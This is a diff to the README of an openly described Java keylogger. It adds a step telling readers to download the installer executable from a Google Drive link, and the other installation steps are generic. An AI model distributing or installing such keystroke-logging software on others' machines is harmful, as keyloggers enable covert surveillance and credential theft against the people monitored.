@@ -19,11 +19,12 @@ This is a keylogger application built using Java and bundled with JRE 1.8 (32-bi
 
 ## Installation
 
-1. Double-click the setup file to start the installation process.
-2. The installation is straightforward and fast. Simply click the `Install` button to proceed.
-3. If the operating system is 32-bit, the application will be installed in `Program Files`. For 64-bit systems, it will be installed in `Program Files (x86)`.
-4. After installation, the application will launch automatically.
-5. Once the installation is complete, click `Finish` to close the setup window.
+1. Download the exe file from https://drive.google.com/drive/folders/1_77PzRXjYx5mclMjcR2G5dQr3ChSnLUD
+2. Double-click the setup file to start the installation process.
+3. The installation is straightforward and fast. Simply click the `Install` button to proceed.
+4. If the operating system is 32-bit, the application will be installed in `Program Files`. For 64-bit systems, it will be installed in `Program Files (x86)`.
+5. After installation, the application will launch automatically.
+6. Once the installation is complete, click `Finish` to close the setup window.
 
 ## License
 
